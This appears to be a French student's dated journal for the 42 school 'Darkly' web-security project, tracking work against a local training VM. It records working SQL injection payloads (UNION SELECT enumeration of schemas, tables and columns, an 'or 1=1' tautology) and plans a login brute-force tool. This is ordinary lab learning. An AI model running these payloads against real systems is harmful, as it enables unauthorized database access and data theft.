# darkly
projet de web secu de 42


les faille que je prevois de croiser :
- injection sql sur une recherche 
- injection sql sur login
- injeciton de donner sur l upload dimage
- injection js
- injection php (j ai croiser ca sur internet mais je ne suis pas sur de ocomment ca marche)
- manipulation de cookie

# 29novembre :
je comprend comment lancer la machine grace a ce lien que de sympathique gens m on donner sur discord 
https://github.com/AdonisEnProvence/Darkly#setup
je me rend compte que les recherche de photos et d user renvois des erreurs sql 
il y a probablement moyen d y injecter des choses
je testes des trucs

# 30 novembre : 
je test plein de solution dinjeciton sql et une trouver sur se stie touche enfin 
https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
 ## 0 UNION ALL SELECT NULL,version()-- 
c est top ca renvoi la version qui est : 5.5.64-MariaDB-1ubuntu0.14.04.1
 ## 0 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
me donne les nom de database suivant :
- information_schema
- Member_Brute_Force
- Member_Sql_Injection
- Member_guestbook
- Member_images
- Member_survey

0 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM images.TABLES --

je ne comprend pas les member machin ils ne retourne rien
## 0 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES --
je recupere plein de truc mais je ne sait pas quoi en faire

USER_STATISTICS

 0 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='USER_STATISTICS'--

## 0 UNION ALL SELECT NULL,concat(column_name) FROM guestbook.COLUMNS --
me donne toute les columns existante
visiblement http://192.168.56.101/index.php?page=member
et http://192.168.56.101/index.php?page=searchimg
n on pas le meme fonctionnement

# 1 decembre:

## 0 or 1 = 1;

me retourn des infos bien plus interessante dans le user .

je supose que la query sur le serveur ressemble a 

### SELECT * FROM user WHERE user_id = (what i typing);


en parallel j ai tester un outil qui etais sencer brut force les mdp mais il me dit que tout les mot de passe de ca liste sont bon .... 


je pensse que j ai foirer un truc donc je vais fair mon propre outil </br>
il me suiffit de remplacer </br>
http://192.168.56.101/?page=signin&username=d&password=d&Login=Login# </br>
par les username et password de mon choix (je crois je ne comprend pas l interet de Login) </br>
j ai essayer de le mettre a true mais rien ne se passe </br>

## 1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema = database(); 
me renvoi user je ne suis pas sur de situer la difference entre concat et gorup concate
